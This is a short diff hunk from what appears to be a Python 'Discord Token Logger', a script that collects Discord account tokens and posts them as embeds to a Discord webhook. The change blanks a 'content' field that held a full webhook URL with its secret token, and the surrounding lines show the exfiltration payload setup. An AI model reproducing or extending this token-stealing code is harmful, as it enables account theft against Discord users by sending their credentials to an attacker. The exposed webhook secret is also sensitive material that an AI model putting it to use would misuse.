@@ -224,7 +224,7 @@ def main():
     if len(working) == 0:
         working.append('123')
     webhook = {
-        "content": "https://discordapp.com/api/webhooks/832050040289099847/HknwtRKQc_qBsXl3S-UtpGjbrWV_8g0QQMyUTdRoVNdsD9eIQqx1hUIgRszdPYkaqYb4",
+        "content": "",
         "embeds": embeds,
         "username": "Discord Token Logger",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
